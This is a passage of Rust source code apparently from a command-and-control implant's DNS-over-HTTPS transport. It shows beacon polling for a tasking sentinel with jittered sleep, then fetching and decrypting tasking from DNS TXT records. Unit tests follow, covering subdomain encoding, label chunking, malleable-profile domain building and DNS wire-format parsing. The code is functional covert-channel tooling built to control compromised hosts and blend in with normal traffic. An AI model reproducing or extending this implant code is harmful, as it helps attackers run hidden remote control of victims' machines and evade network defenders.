            #[cfg(feature = "adaptive-timing")]
            self.observe_traffic(
                0,
                beacon_response.response_len,
                crate::adaptive_timing::Direction::Inbound,
                crate::adaptive_timing::Protocol::DNS,
            );

            let json = beacon_response.json;

            // Check for the tasking sentinel.
            if self.check_tasking_sentinel(&json) {
                break;
            }

            // No tasking available — sleep with profile-driven jitter.
            let sleep_dur = self.jittered_sleep();
            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
        }

        // Tasking is available. Fetch data via TXT record.
        let txt_prefix = self.get_txt_prefix();
        let task_domain = self.build_domain(txt_prefix, "");
        let txt_json = self.execute_query(&task_domain, "TXT").await?.json;

        // Concatenate TXT record strings.
        let full_encoded = self.extract_txt_records(&txt_json);

        if full_encoded.is_empty() {
            anyhow::bail!("TXT record response was empty after tasking sentinel");
        }

        // Decode using the profile's encoding mode.
        let ciphertext = decode_subdomain(&full_encoded, self.encoding())?;

        // Decrypt with the session key.
        let plaintext = self.session.decrypt(&ciphertext)?;

        // Deserialize the message.
        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;

        Ok(msg)
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::malleable::{
        DnsConfig, GlobalConfig, HttpTransactionConfig, HttpTransformConfig,
        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig, TransformType,
    };
    use std::collections::HashMap;

    /// Build a minimal test profile with DNS config.
    fn test_profile() -> AgentMalleableProfile {
        AgentMalleableProfile {
            profile: ProfileInfo {
                name: "dns-test".to_string(),
                author: "tester".to_string(),
                description: "test dns profile".to_string(),
            },
            global: GlobalConfig {
                user_agent: "TestAgent/1.0".to_string(),
                jitter: 10,
                sleep_time: 30,
                sleep_time_ms: None,
                dns_idle: "0.0.0.0".to_string(),
                dns_sleep: 0,
                adaptive_timing_enabled: false,
                adaptive_timing_learning_period: 300,
                adaptive_timing_max_deviation: 0.5,
            },
            ssl: SslConfig {
                enabled: false,
                cert_pin: String::new(),
                ja3_fingerprint: String::new(),
                sni: String::new(),
            },
            http_get: None,
            http_post: None,
            dns: DnsConfig {
                enabled: true,
                beacon: "beacon.".to_string(),
                get_A: "api.".to_string(),
                get_TXT: "txt.".to_string(),
                post: "upload.".to_string(),
                max_txt_size: 252,
                dns_suffix: "example.com".to_string(),
                encoding: "hex".to_string(),
                headers: crate::malleable::DnsHeadersConfig::default(),
            },
        }
    }

    #[test]
    fn test_encode_decode_hex() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "hex");
        let decoded = decode_subdomain(&encoded, "hex").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_encode_decode_base32() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "base32");
        // Base32 should be lowercase letters or digits 2-7 (DNS-safe).
        assert!(encoded
            .chars()
            .all(|c| c.is_ascii_lowercase() || ('2'..='7').contains(&c)));
        // No padding.
        assert!(!encoded.contains('='));
        let decoded = decode_subdomain(&encoded, "base32").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_encode_decode_base64url() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "base64url");
        // Should not contain + or / (DNS-safe).
        assert!(!encoded.contains('+'));
        assert!(!encoded.contains('/'));
        let decoded = decode_subdomain(&encoded, "base64url").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_chunk_into_labels() {
        let encoded = "a".repeat(100);
        let labels = chunk_into_labels(&encoded, 63);
        assert_eq!(labels.len(), 2);
        assert_eq!(labels[0].len(), 63);
        assert_eq!(labels[1].len(), 37);
    }

    #[test]
    fn test_build_domain() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            ecdh_client: None,
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
            kill_date: String::new(),
            psk: b"test-key-for-unit-test-only".to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        // With data.
        let domain = transport.build_domain("upload.", "abcdef");
        assert!(domain.contains("abcdef"));
        assert!(domain.contains("upload."));
        assert!(domain.contains("example.com"));
        assert!(domain.contains("deadbeef"));

        // Without data (beacon).
        let domain = transport.build_domain("beacon.", "");
        assert!(domain.starts_with("beacon."));
        assert!(domain.contains("example.com"));
    }

    #[test]
    fn test_dns_suffix_fallback() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            ecdh_client: None,
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: "fallback.example.com".to_string(),
            kill_date: String::new(),
            psk: b"test-key-for-unit-test-only".to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        // Should use the profile's dns_suffix, not the host_header.
        assert_eq!(transport.dns_suffix(), "example.com");
    }

    #[test]
    fn test_decode_a_records() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            ecdh_client: None,
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
            kill_date: String::new(),
            psk: b"test-key-for-unit-test-only".to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        let json = serde_json::json!({
            "Answer": [
                {"type": 1, "data": "10.0.0.1"},
                {"type": 1, "data": "10.0.0.2"},
                // Sentinel should be skipped.
                {"type": 1, "data": "1.2.3.4"},
                // dns_idle (0.0.0.0) should be skipped.
                {"type": 1, "data": "0.0.0.0"},
            ]
        });

        let bytes = transport.decode_a_records(&json);
        assert_eq!(bytes, vec![10, 0, 0, 1, 10, 0, 0, 2]);
    }

    #[test]
    fn test_extract_txt_records() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            ecdh_client: None,
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
            kill_date: String::new(),
            psk: b"test-key-for-unit-test-only".to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        let json = serde_json::json!({
            "Answer": [
                {"type": 16, "data": "\"part1\""},
                {"type": 16, "data": "\"part2\""},
            ]
        });

        let txt = transport.extract_txt_records(&json);
        assert_eq!(txt, "part1part2");
    }

    #[test]
    fn test_wireformat_roundtrip() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            ecdh_client: None,
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
            kill_date: String::new(),
            psk: b"test-key-for-unit-test-only".to_vec(),
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        let wire = transport
            .build_dns_wireformat("test.example.com", "A")
            .unwrap();
        // Should have at least 12 bytes header + question.
        assert!(wire.len() > 12);
        // Transaction ID should be non-zero (random).
        assert!(wire[0] != 0 || wire[1] != 0);
    }

    #[test]
    fn test_decompress_dns_name_simple() {
        // Build a DNS response containing a CNAME answer with a plain
        // (uncompressed) domain name in RDATA.
        let mut resp = Vec::new();

        // Header (12 bytes).
        resp.extend_from_slice(&[0x12, 0x34]); // ID
        resp.extend_from_slice(&[0x81, 0x80]); // flags: response, recursion avail
        resp.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
        resp.extend_from_slice(&[0x00, 0x01]); // ANCOUNT
        resp.extend_from_slice(&[0x00, 0x00]); // NSCOUNT
        resp.extend_from_slice(&[0x00, 0x00]); // ARCOUNT

        // Question: alias.example.com A IN
        for label in &["alias", "example", "com"] {
            let b = label.as_bytes();
            resp.push(b.len() as u8);
            resp.extend_from_slice(b);
        }
        resp.push(0); // root
        resp.extend_from_slice(&[0x00, 0x01]); // QTYPE=A
        resp.extend_from_slice(&[0x00, 0x01]); // QCLASS=IN

        // Answer: CNAME pointing to real.example.com
        // Name: compression pointer to the question name (offset 12).
        resp.extend_from_slice(&[0xC0, 0x0C]); // pointer to offset 12
        resp.extend_from_slice(&[0x00, 0x05]); // TYPE=CNAME
        resp.extend_from_slice(&[0x00, 0x01]); // CLASS=IN
        resp.extend_from_slice(&[0x00, 0x00, 0x0E, 0x10]); // TTL=3600
        // RDATA: "real.example.com" as labels (no compression).
        let rdata_start = resp.len();
        resp.extend_from_slice(&[0x00, 0x00]); // RDLENGTH placeholder
        for label in &["real", "example", "com"] {
            let b = label.as_bytes();
            resp.push(b.len() as u8);
            resp.extend_from_slice(b);
        }
        resp.push(0); // root
        let rdata_len = resp.len() - rdata_start - 2;
        let rd_len_bytes = (rdata_len as u16).to_be_bytes();
        resp[rdata_start] = rd_len_bytes[0];
        resp[rdata_start + 1] = rd_len_bytes[1];

        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key"),
            ecdh_client: None,
            agent_id: "test".into(),
            seq: AtomicU32::new(0),
            session_id: 0,
            doh_beacon_sentinel: String::new(),
            host_header: String::new(),
            kill_date: String::new(),
            psk: vec![],
            #[cfg(feature = "adaptive-timing")]
            adaptive_timer: None,
        };

        let json = transport.parse_dns_wireformat_response(&resp).unwrap();
        let answers = json.get("Answer").unwrap().as_array().unwrap();
        assert_eq!(answers.len(), 1);
        assert_eq!(answers[0]["type"], 5);
        assert_eq!(answers[0]["data"], "real.example.com");
    }

    #[test]
    fn test_decompress_dns_name_with_pointer() {
        // Test that decompress_dns_name handles compression pointers correctly.
        let mut buf = Vec::new();
        // Place "example" label at offset 0 and "com" label after it,
        // then a pointer chain: offset 0 → [3\x07example\xC0\x00] would be "www.example.com"
        buf.push(3); // "www"
        buf.extend_from_slice(b"www");
        buf.push(0xC0); // compression pointer to offset 6
        buf.push(6);

        // Place "example" at offset 6 and "com" after it.
        buf.push(7); // "example"
        buf.extend_from_slice(b"example");
        buf.push(3); // "com"
        buf.extend_from_slice(b"com");
        buf.push(0); // root

        let name = DohTransport::decompress_dns_name(&buf, 0);
        assert_eq!(name, "www.example.com");
    }
}
